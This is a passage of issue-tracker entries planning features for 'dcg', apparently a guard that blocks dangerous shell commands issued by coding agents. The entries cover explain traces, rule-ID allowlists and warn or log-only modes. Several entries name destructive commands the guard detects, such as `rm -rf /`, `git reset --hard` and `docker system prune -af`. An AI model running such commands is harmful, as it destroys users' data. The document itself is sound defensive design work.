{"id":"git_safety_guard-1gt","title":"Epic: Explainability, UX, and Operations","description":"# Epic: Explainability, UX, and Operations\n\n## Why this epic exists\n\nEven a correct guard will occasionally block or warn. When that happens, the tool must:\n\n- Explain *what* matched (pack + pattern), *where* it matched (execution context), and *why* itâ€™s considered dangerous.\n- Provide clear, low-friction escape hatches (manual run guidance, allowlisting, warn/log-only modes).\n- Produce logs that allow teams to diagnose false positives and tune configuration.\n\nWithout this, users experience â€œannoying and disruptiveâ€ interruptions and will disable the guard.\n\n## Goals\n\n1. **Explainability:** a human can quickly understand the decision without reading source.\n2. **Ergonomics for coding agents:** easy to test, easy to allowlist, easy to see what would be blocked.\n3. **Operational knobs:** block vs warn vs log-only; per-pack enable/disable; per-pattern allowlist.\n4. **High-quality logging:** deterministic, machine-parseable (optional), and privacy-conscious.\n\n## Non-goals\n\n- Building a full policy language; keep configuration understandable.\n\n## Acceptance criteria (epic-level)\n\n- A user can run something like `dcg test --explain \"...\"` and see:\n  - normalized command\n  - execution contexts detected\n  - packs considered/skipped (keyword gating)\n  - the first blocking match with `pack_id` + `pattern_name`\n- The deny message includes a stable identifier that can be allowlisted without copying regexes.\n- Logging can be enabled to collect blocked events with timestamps, pack/pattern IDs, and command (with optional redaction).\n","status":"open","priority":2,"issue_type":"epic","created_at":"2026-01-07T19:57:39.637876513-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:57:39.637876513-05:00"}
{"id":"git_safety_guard-1gt.1","title":"Add dcg explain (full decision trace; pretty/json/compact)","description":"## Objective\n\nShip an explainability mode that makes `dcg` trustworthy and debuggable:\n\n- `dcg explain \"\u003ccommand\u003e\"` (primary UX)\n- `dcg test --explain \"\u003ccommand\u003e\"` (alias for existing CLI habits)\n\nExplain mode must show exactly why a command was allowed/blocked, with enough detail that users can resolve false positives quickly (goal: under 2 minutes).\n\n## Why this matters\n\nWhen a hook blocks a command, users immediately ask:\n\n- What matched?\n- Where did it match (executed vs data span)?\n- Which packs were considered vs skipped (keyword gating)?\n- What is the stable rule ID I should allowlist (without copying regex)?\n- What safe alternative should I use instead?\n\nIf we canâ€™t answer these questions quickly, users disable the guard.\n\n## Hard constraints\n\n- Hook path must never hang: no interactive prompts, no waiting for stdin.\n- Fast path must stay fast: explain tracing is opt-in and must not add overhead when disabled.\n- Deterministic: the same input yields the same trace and rule ID.\n\n## Proposed UX\n\n### Pretty (default)\n\nBox/sectioned output designed for human scanning. Includes:\n\n- raw input command\n- normalized command\n- decision (ALLOW/WARN/DENY)\n- latency breakdown (per stage)\n- execution-context spans (executed vs data)\n- allowlist evaluation (entries checked + match, if any)\n- pack evaluation (packs checked vs skipped; first match)\n- stable rule id (`pack_id:pattern_name`)\n- matched span (byte offsets) + matched text preview\n- suggestions (safe alternatives + \"how to allow safely\" command examples)\n\n### JSON\n\nMachine-readable output for CI tooling, bug reports, and snapshot testing.\n\nMinimum fields:\n\n- `command`, `normalized_command`\n- `decision`\n- `total_duration_us`\n- `steps[]`: `{ name, duration_us, details }`\n- `context.spans[]`: `{ start, end, kind, text_preview? }`\n- `pack_summary`: enabled packs, skipped packs (keyword gating)\n- `match`: `{ pack_id, pattern_name, rule_id, reason, matched_span }`\n- `allowlist`: `{ layers_checked, matched_entry? }`\n- `suggestions[]`: `{ kind, text, command? }`\n\n### Compact\n\nSingle-line output suitable for logs:\n\n- `DENY core.git:reset-hard \"git reset --hard\" â€” \u003creason\u003e (847us)`\n\n## Technical design (trace model)\n\nAdd a trace data model that can be enabled in CLI-only modes:\n\n- `ExplainTrace { decision, steps[], match_identity?, suggestions[] }`\n- Each `TraceStep` records:\n  - stage name\n  - duration\n  - stage-specific details\n\nTrace steps should cover (at minimum):\n\n1. Input parsing (hook JSON vs CLI input)\n2. Pack-aware keyword gating (global quick reject)\n3. Normalization (wrappers, path stripping)\n4. Execution-context classification (spans)\n5. Allowlist checks (project/user/system)\n6. Pack evaluation (safe then destructive; which packs were skipped)\n7. Policy decision layer (deny vs warn vs log-only)\n8. Output formatting summary\n\nKey implementation constraint:\n\n- When tracing is disabled, the evaluator should not allocate or capture extra data.\n\n## Dependencies\n\nExplain mode becomes valuable only when these are in place:\n\n- deterministic pack evaluation + stable match identity (`pack_id` + `pattern_name`)\n- shared evaluator used by both CLI and hook\n- execution-context classification (or at least the safe string-arg registry)\n- allowlisting by rule ID (so explain can recommend an allowlist command)\n\n## Acceptance criteria\n\n- `dcg explain` works for both blocked and allowed commands.\n- For a blocked command, explain shows the exact `pack_id:pattern_name` and matched span.\n- For a false-positive-like command (e.g., `bd create --description=\"rm -rf\"`), explain explicitly shows the string span as data, and that matching was skipped for it.\n- Output is deterministic (golden tests stable across runs).\n- Hook path remains unchanged (no interactive prompt; no output for allow).\n\n## Test plan\n\n- Golden/snapshot tests for:\n  - pretty output (stable sections + key fields)\n  - JSON output schema\n  - compact single-line output\n- Determinism tests: same input run 100 times yields the same match identity.\n- Latency sanity: explain mode can be slower, but must remain bounded and must not affect hook mode when disabled.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:04:20.427652456-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:00:54.65954809-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.1","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T20:04:20.428791912-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T20:05:37.096250877-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:05:42.129983029-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T20:05:47.162937778-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.1.1","title":"Explain trace data model + opt-in instrumentation","description":"## Objective\n\nIntroduce a trace data model and instrumentation hooks in the shared evaluator so `dcg explain` can capture a complete decision trace.\n\nThis task is about:\n\n- defining trace structs/enums\n- collecting timings and key decision facts\n- ensuring tracing is truly opt-in (no overhead when disabled)\n\nIt is not about output formatting (pretty/json/compact), which is handled by sibling tasks.\n\n## Design requirements\n\n### Trace data structures\n\nDefine an internal, allocation-conscious model:\n\n- `ExplainTrace` (top-level)\n- `TraceStep` (name + duration + step-specific details)\n- `TraceDetails` variants for:\n  - keyword gating (enabled keywords summary + first hit)\n  - normalization transformations\n  - context spans (executed vs data)\n  - allowlist checks (layers checked + match)\n  - pack evaluation (packs considered vs skipped; patterns checked; first match)\n  - policy decision (deny/warn/log-only)\n\n### Timing model\n\n- Capture per-step duration.\n- Capture total duration.\n- Use monotonic time (`Instant`) and store integer microseconds in final output.\n\n### Zero-overhead when disabled\n\n- The evaluator should accept something like `Option\u003c\u0026mut TraceCollector\u003e`.\n- In the hot path, avoid allocations when the option is `None`.\n- Do not build expensive strings unless tracing is enabled.\n\n## Acceptance criteria\n\n- Shared evaluator can optionally return `Decision + ExplainTrace` (or `Decision` plus trace in an outparam).\n- Trace includes enough raw data for:\n  - match highlighting\n  - pack skip reasons\n  - allowlist and context analysis summaries\n- When tracing is disabled, benchmarks show no measurable regression on the allow path.\n\n## Tests\n\n- Unit tests for:\n  - trace step ordering (stable)\n  - trace includes match identity when blocked\n  - trace includes \"skipped\" packs when keyword gating skips\n- Microbench (or integration perf harness) verifying tracing disabled has no cost.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:01:29.518970547-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:01:29.518970547-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.1.1","depends_on_id":"git_safety_guard-1gt.1","type":"parent-child","created_at":"2026-01-07T21:01:39.20691745-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.1","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T21:20:29.600928657-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.1","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T21:20:34.696144333-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.1.2","title":"Explain output: pretty formatter + match highlighting","description":"## Objective\n\nImplement the human-friendly pretty output for `dcg explain`.\n\n## Output requirements\n\nPretty output should be optimized for answering:\n\n1. What was the decision?\n2. What matched (rule id) and where?\n3. Which spans were treated as executed vs data?\n4. What can I do next (safe alternatives, allowlist command)?\n\nMinimum sections:\n\n- Header: input + decision + total latency\n- Execution-context analysis:\n  - spans with byte ranges and kind\n  - optionally show a preview of each span\n- Pipeline trace:\n  - key stages with timings\n  - keyword gating details (enabled keyword summary + first hit)\n  - packs considered vs skipped\n- Match:\n  - rule id, reason\n  - matched span and matched text preview\n  - highlight match (underline/caret/box)\n- Suggestions:\n  - safe alternative(s)\n  - allowlist command example(s)\n\n## Determinism\n\n- Output ordering must be deterministic.\n- Field names and section order must be stable for golden tests.\n\n## Constraints\n\n- Colors should be disabled when stderr is not a TTY (match existing behavior).\n- Pretty output can be slightly verbose but should not exceed one screen for most commands.\n\n## Acceptance criteria\n\n- `dcg explain` pretty output is readable and includes all minimum sections.\n- For allowlisted decisions, pretty output shows the allowlist entry that matched.\n- For allowed-by-data-context decisions, pretty output explicitly states that matching was skipped for data spans.\n\n## Tests\n\n- Golden tests for 5-10 representative commands:\n  - clear allow\n  - clear deny\n  - allow due to safe string-arg registry\n  - allow due to allowlist override\n  - complex quoting / pipe case\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:01:55.28188435-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:01:55.28188435-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.1.2","depends_on_id":"git_safety_guard-1gt.1","type":"parent-child","created_at":"2026-01-07T21:02:05.115909525-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.2","depends_on_id":"git_safety_guard-1gt.1.1","type":"blocks","created_at":"2026-01-07T21:20:39.791441242-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.2","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T21:21:16.32026071-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.2","depends_on_id":"git_safety_guard-1gt.2.2","type":"blocks","created_at":"2026-01-07T21:21:26.506475271-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.1.3","title":"Explain output: JSON schema + snapshot tests","description":"## Objective\n\nImplement the `--format json` output for `dcg explain` and lock it down with snapshot tests.\n\n## Requirements\n\n### JSON schema (v1)\n\nThe JSON should be stable and explicit, with forward-compat in mind.\n\nMinimum:\n\n- `schema_version`: integer (start at 1)\n- `command`, `normalized_command`\n- `decision`: allow|warn|deny\n- `total_duration_us`\n- `steps[]`:\n  - `name`\n  - `duration_us`\n  - `details` (tagged union)\n- `context`:\n  - `spans[]`: `{ start, end, kind, preview? }`\n  - `safe_string_registry_match?`\n- `allowlist`:\n  - `layers_checked[]`\n  - `matched_entry?` (redacted if configured)\n- `match?`:\n  - `pack_id`, `pattern_name`, `rule_id`\n  - `reason`\n  - `matched_span`: `{ start, end }`\n  - `matched_text_preview?`\n- `suggestions[]`\n\n### Redaction\n\n- Provide a mode that redacts sensitive spans (e.g., quoted strings), or truncates previews.\n- Redaction must not break the schema.\n\n## Acceptance criteria\n\n- `dcg explain --format json` emits valid JSON for allow and deny decisions.\n- JSON ordering is stable (or we normalize before snapshot compare).\n- `schema_version` is present and documented.\n\n## Tests\n\n- Snapshot tests using representative commands (same set as pretty output tests).\n- A schema-shape test that asserts required keys exist.\n- A regression test ensuring new fields are additive only (no breaking changes without version bump).\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:02:21.636616557-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:02:21.636616557-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.1.3","depends_on_id":"git_safety_guard-1gt.1","type":"parent-child","created_at":"2026-01-07T21:02:30.088365893-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.3","depends_on_id":"git_safety_guard-1gt.1.1","type":"blocks","created_at":"2026-01-07T21:20:44.883423719-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.3","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T21:21:21.41269061-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.3","depends_on_id":"git_safety_guard-1gt.2.2","type":"blocks","created_at":"2026-01-07T21:21:31.602200676-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.1.4","title":"Explain output: compact single-line formatter","description":"## Objective\n\nImplement the `--format compact` single-line output for `dcg explain`.\n\n## Why\n\nCompact output is useful for:\n\n- log files\n- CI summaries\n- quick debugging when you don't need the full trace\n\n## Format requirements\n\n- Must include: decision, rule id (when matched), short reason, latency.\n- Must include: a safely truncated command preview.\n\nExamples:\n\n- `ALLOW (94us) git status`\n- `DENY core.git:reset-hard (847us) git reset --hard â€” \u003creason\u003e`\n- `WARN containers.docker:system-prune (1.2ms) docker system prune -af â€” \u003creason\u003e`\n\n## Acceptance criteria\n\n- Compact output is one line with predictable tokenization.\n- Truncation is deterministic and does not break UTF-8.\n- Works for allow/warn/deny.\n\n## Tests\n\n- Golden tests for representative commands.\n- Truncation tests (very long command, unicode input).\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:02:43.986061353-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:02:43.986061353-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.1.4","depends_on_id":"git_safety_guard-1gt.1","type":"parent-child","created_at":"2026-01-07T21:02:53.160853911-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.4","depends_on_id":"git_safety_guard-1gt.1.1","type":"blocks","created_at":"2026-01-07T21:20:49.976697137-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.1.5","title":"Wire explain mode into CLI (dcg explain + test --explain)","description":"## Objective\n\nExpose explain mode through the CLI in an ergonomic way.\n\n## CLI design\n\n### Primary\n\n- `dcg explain \"\u003ccommand\u003e\" [--format pretty|json|compact]`\n\n### Alias\n\n- `dcg test \"\u003ccommand\u003e\" --explain [--format ...]`\n\nBoth should call the same shared evaluator + trace collector.\n\n## Behavioral requirements\n\n- Explain mode must not change hook behavior.\n- Explain mode must load config and enabled packs the same way as hook mode.\n- Explain mode must support optionally applying allowlists (project + user) for \"what would happen\" debugging.\n\n## Acceptance criteria\n\n- `dcg explain` exists and is documented in `dcg --help`.\n- `dcg test --explain` continues to work (or is introduced) as an alias.\n- Exit codes:\n  - allow: 0\n  - warn: 0 (but distinguish in output)\n  - deny: non-zero in CLI mode (optional, but document)\n\n## Tests\n\n- CLI integration tests that run the binary with `dcg explain` and assert expected output shape.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:03:07.448855603-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:03:07.448855603-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.1.5","depends_on_id":"git_safety_guard-1gt.1","type":"parent-child","created_at":"2026-01-07T21:03:15.799310699-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.5","depends_on_id":"git_safety_guard-1gt.1.2","type":"blocks","created_at":"2026-01-07T21:20:55.072028651-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.5","depends_on_id":"git_safety_guard-1gt.1.3","type":"blocks","created_at":"2026-01-07T21:21:00.168986127-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.1.5","depends_on_id":"git_safety_guard-1gt.1.4","type":"blocks","created_at":"2026-01-07T21:21:05.261255534-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2","title":"Allowlist by stable rule ID (project/user allowlists + CLI)","description":"## Objective\n\nMake customization safe, ergonomic, and auditable by allowing users to allowlist specific rules via stable identifiers `(pack_id, pattern_name)` instead of raw regex.\n\nIn other words:\n\n- allowlist a rule like `core.git:reset-hard`\n- not a broad regex like `pattern = \"rm -rf.*\"`\n\nThis must dramatically reduce velocity-destroying false positives while preserving safety.\n\n## Why rule ID, not regex?\n\nRaw regex allow-overrides are:\n\n- dangerous (easy to allow too much)\n- brittle (regex changes can break intent)\n- hard to audit\n\nRule ID allowlisting is:\n\n- constrained (only bypasses a specific rule)\n- stable (survives regex refactors)\n- auditable (\"who allowed what and why\")\n\n## Allowlist layers\n\nWe want three layers (highest priority first):\n\n1. Project allowlist (checked into repo): `.dcg/allowlist.toml`\n2. User allowlist (per user machine): `~/.config/dcg/allowlist.toml` (or embedded in config)\n3. System allowlist (optional): `/etc/dcg/allowlist.toml`\n\nProject allowlist is the most important: one fix benefits the whole team via code review.\n\n## File format (`.dcg/allowlist.toml`)\n\nEntry types (safe-by-default first):\n\n1. `rule = \"pack_id:pattern_name\"` (recommended)\n2. `exact_command = \"...\"` (rare)\n3. `command_prefix = \"...\"` + `context = \"string-argument\"|...` (for documentation tools)\n4. `pattern = \"...\"` (regex) only when `risk_acknowledged=true`\n\nAdditional fields:\n\n- `reason` (required)\n- `added_by`, `added_at` (strongly recommended; CLI should set)\n- `expires_at` (optional; expired entries ignored)\n- `conditions` map (optional; env-gated, e.g. CI=true)\n\nWildcard rules:\n\n- allow `core.git:*` style within a pack\n- do NOT allow `*:*`\n\n## CLI commands\n\nDesign goal: users should not have to hand-edit TOML to fix a false positive.\n\n- `dcg allowlist add \u003crule_id\u003e --reason \"...\" [--project|--user] [--expires ...] [--condition KEY=VAL]`\n- `dcg allowlist add-command \"\u003ccmd\u003e\" --reason \"...\" [--expires ...]`\n- `dcg allowlist list [--project|--user]`\n- `dcg allowlist remove \u003crule_id|entry_id\u003e`\n- `dcg allowlist validate` (strict validation + warnings for risky entries)\n\nIntegration with explain mode:\n\n- `dcg explain` should print the exact allowlist command needed to allow the match.\n\n## Evaluator integration\n\n- Allowlist evaluation happens after we have a candidate match identity.\n- Allowlisting a rule must bypass ONLY that rule (not other rules in other packs).\n- Explain mode must report:\n  - which allowlist layer matched\n  - which entry matched\n  - the override (DENY -\u003e ALLOW, DENY -\u003e WARN, etc if modes exist)\n\n## Security constraints\n\n- invalid regex or invalid TOML must never crash the hook; fail open with warnings (CLI should be strict)\n- risky allowlist shapes must be noisy:\n  - require `risk_acknowledged=true` for regex entries\n  - warn on overly broad patterns\n  - warn on wildcards like `core.git:*`\n\n## Acceptance criteria\n\n- A user can allowlist a single named rule without writing regex.\n- Unit tests confirm allowlisting does not accidentally allow unrelated dangerous commands.\n- Expired allowlist entries are ignored and surfaced in `dcg allowlist validate`.\n- Allowlist layering works (project overrides user, etc).\n\n## Tests\n\n- allowlist parser tests\n- allowlist match tests:\n  - rule id exact\n  - rule id wildcard\n  - exact command\n  - prefix+context\n  - regex (requires ack)\n- allowlist integration tests:\n  - blocked command becomes allowed when allowlisted\n  - unrelated dangerous command remains blocked\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:04:52.747995072-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:03:45.397800662-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.2","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T20:04:52.749139728-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2","depends_on_id":"git_safety_guard-99e.2.2","type":"blocks","created_at":"2026-01-07T20:05:52.198404888-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:05:57.230809781-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2.1","title":"Allowlist: file format + parsing + layering (project/user/system)","description":"## Objective\n\nImplement parsing and loading of allowlist files across layers:\n\n- project: `.dcg/allowlist.toml`\n- user: `~/.config/dcg/allowlist.toml` (or config-embedded)\n- system: `/etc/dcg/allowlist.toml` (optional)\n\n## Requirements\n\n- Parse TOML into a strongly-typed `Allowlist` model.\n- Validate required fields (`reason` etc.) and represent invalid entries without panicking.\n- Layer precedence should be explicit and testable.\n- Loading failures:\n  - hook mode: must not crash; treat as no allowlist for that layer\n  - CLI validate: should surface errors clearly\n\n## Acceptance criteria\n\n- All layers load independently.\n- Missing files are treated as empty allowlists.\n- Invalid TOML or invalid entries do not crash the hook.\n\n## Tests\n\n- Parse valid allowlists.\n- Reject/flag invalid allowlists.\n- Precedence tests: project overrides user.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:04:01.129218009-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:04:01.129218009-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.2.1","depends_on_id":"git_safety_guard-1gt.2","type":"parent-child","created_at":"2026-01-07T21:04:09.493546553-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2.2","title":"Allowlist: evaluator integration (override decision safely)","description":"## Objective\n\nIntegrate allowlist checks into the shared evaluator.\n\n## Required behavior\n\n- Evaluate packs and find the first high-confidence match.\n- Compute the stable rule ID `pack_id:pattern_name`.\n- Check allowlists after match identity is known.\n- If allowlisted:\n  - override DENY -\u003e ALLOW (or DENY -\u003e WARN if decision modes exist)\n  - record the allowlist reason and layer for explain/logging\n\nSafety rule:\n\n- Allowlisting must only bypass the specific matched rule (or an allowed pack-scoped wildcard). It must not disable other packs.\n\n## Edge cases\n\n- Patterns with no `pattern_name`: define a policy (either forbid allowlisting or synthesize a stable name).\n- Multiple matches: only the \"winning\" match should be allowlist-checkable (unless we later support multi-match reporting).\n\n## Acceptance criteria\n\n- Allowlisting a rule bypasses only that rule.\n- Non-allowlisted dangerous commands remain blocked.\n- Explain and logs can show the allowlist override (layer + entry).\n\n## Tests\n\n- Unit tests:\n  - allowlist hit overrides deny\n  - allowlist miss does not change decision\n  - wildcard allowlist matches only within pack\n- Integration test: end-to-end deny becomes allow when allowlisted.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:04:25.133130057-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:04:25.133130057-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.2.2","depends_on_id":"git_safety_guard-1gt.2","type":"parent-child","created_at":"2026-01-07T21:04:34.537722772-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.2","depends_on_id":"git_safety_guard-1gt.2.1","type":"blocks","created_at":"2026-01-07T21:21:41.223599417-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.2","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T21:21:46.350674835-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.2","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T21:21:51.466844665-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2.3","title":"Allowlist CLI: add/list/remove/validate (project + user)","description":"## Objective\n\nImplement `dcg allowlist` CLI commands so users can fix false positives without editing TOML by hand.\n\n## Commands (v1)\n\n- `dcg allowlist add \u003crule_id\u003e --reason \"...\" [--project|--user] [--expires ...] [--condition KEY=VAL]`\n- `dcg allowlist add-command \"\u003ccmd\u003e\" --reason \"...\" [--project|--user] [--expires ...]`\n- `dcg allowlist list [--project|--user]`\n- `dcg allowlist remove \u003crule_id|entry_id\u003e [--project|--user]`\n- `dcg allowlist validate [--project|--user]`\n\n## Behavioral requirements\n\n- Default scope should be explicit:\n  - either require `--project|--user`, or default to project if in a git repo and file exists\n- All mutations must preserve TOML readability and comments where feasible.\n- CLI should set audit metadata automatically:\n  - `added_by` (from env/user)\n  - `added_at` (RFC3339)\n\n## Acceptance criteria\n\n- CLI can create `.dcg/allowlist.toml` if missing.\n- CLI mutations are idempotent and stable (no reordering chaos).\n- Validate prints actionable errors/warnings.\n\n## Tests\n\n- CLI integration tests for add/list/remove.\n- Validation tests for:\n  - expired entries\n  - missing reason\n  - unknown rule id\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:04:49.686087604-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:04:49.686087604-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.2.3","depends_on_id":"git_safety_guard-1gt.2","type":"parent-child","created_at":"2026-01-07T21:04:59.51609388-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.3","depends_on_id":"git_safety_guard-1gt.2.1","type":"blocks","created_at":"2026-01-07T21:21:56.560137459-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2.4","title":"Allowlist: conditions, expiration, and wildcard safety rules","description":"## Objective\n\nImplement the more advanced allowlist semantics in a way that is safe and predictable.\n\n## Semantics to support\n\n### 1) Expiration\n\n- `expires_at` field on entries.\n- Expired entries:\n  - evaluator: ignored\n  - validate: warning (or error if `--strict`)\n\n### 2) Conditions (environment gating)\n\n- `conditions = { KEY = \"VAL\" }` maps to environment variables.\n- Conditions are ANDed.\n- Missing env var means condition not met.\n\n### 3) Wildcards\n\n- Allow `pack_id:*` (scoped to one pack).\n- Disallow `*:*`.\n- Allow `pack_id:prefix-*` only if we commit to stable naming conventions.\n\n### 4) Risk acknowledgement\n\n- Regex allowlist entries require `risk_acknowledged=true`.\n- Validation should warn on overly broad regex (heuristics).\n\n## Acceptance criteria\n\n- Expiration works and is test-covered.\n- Conditions work (CI-only allowlists etc).\n- Wildcard constraints prevent unsafe global bypass.\n\n## Tests\n\n- Expiration tests using fixed timestamps.\n- Condition tests with env var manipulation.\n- Wildcard constraint tests.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:05:14.997598561-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:05:14.997598561-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.2.4","depends_on_id":"git_safety_guard-1gt.2","type":"parent-child","created_at":"2026-01-07T21:05:24.524137941-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.4","depends_on_id":"git_safety_guard-1gt.2.1","type":"blocks","created_at":"2026-01-07T21:22:01.654562185-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.4","depends_on_id":"git_safety_guard-1gt.2.2","type":"blocks","created_at":"2026-01-07T21:22:06.749684456-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2.5","title":"Allowlist: comprehensive tests + documentation","description":"## Objective\n\nMake allowlisting safe in practice by shipping:\n\n- comprehensive automated tests\n- clear user documentation\n\n## Tests\n\n### Parser/validation\n\n- invalid TOML does not crash hook\n- missing required fields surfaced in validate\n- risky entries require acknowledgement\n\n### Evaluator integration\n\n- allowlist overrides only the intended rule\n- allowlisting does not disable other packs\n- allowlist layer precedence works\n\n### CLI\n\n- add/list/remove idempotence\n- validate output contains actionable messages\n\n## Docs\n\n- README section: \"Resolving false positives\" describing:\n  - `dcg explain`\n  - `dcg allowlist add ...`\n  - recommended allowlist shapes\n  - security caveats\n\n## Acceptance criteria\n\n- Tests cover the core allowlist behaviors and guard against regressions.\n- Docs are sufficient that a user can resolve a false positive without reading source.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:05:38.822435052-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:05:38.822435052-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.2.5","depends_on_id":"git_safety_guard-1gt.2","type":"parent-child","created_at":"2026-01-07T21:05:46.8623866-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.5","depends_on_id":"git_safety_guard-1gt.2.2","type":"blocks","created_at":"2026-01-07T21:22:11.842613996-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.5","depends_on_id":"git_safety_guard-1gt.2.3","type":"blocks","created_at":"2026-01-07T21:22:16.936078434-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.5","depends_on_id":"git_safety_guard-1gt.2.4","type":"blocks","created_at":"2026-01-07T21:22:22.029722971-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.3","title":"Add decision modes: block vs warn vs log-only","description":"## Objective\n\nReduce disruption by allowing less-confident detections to warn or log instead of hard-blocking, while keeping high-confidence matches as hard blocks.\n\n## Background\n\nSome detections are extremely high confidence (e.g., `rm -rf /`, `git reset --hard`). Others are context-dependent or susceptible to false positives.\n\nA single binary mode (always deny) can be overly disruptive, especially when expanding into heredoc scanning and AST-based heuristics.\n\n## Proposed behavior\n\nAdd a policy layer that can choose between:\n\n- **deny** (current behavior): block command\n- **warn**: print warning to stderr and/or log, but allow command (no JSON deny)\n- **log-only**: silent allow, but log event for later review\n\nPolicy should be configurable:\n\n- global default (e.g., deny)\n- per-pack override\n- per-pattern override\n\n## Safety constraints\n\n- Default should remain deny for known-catastrophic patterns.\n- Warn/log-only must never apply to the most dangerous patterns unless the user explicitly configures it.\n\n## Acceptance criteria\n\n- Config supports selecting mode per pack/pattern.\n- Output is correct per mode:\n  - deny: stderr warning + stdout JSON deny\n  - warn: stderr warning, no stdout\n  - log-only: optional log entry, no stderr/stdout\n- Tests cover all three 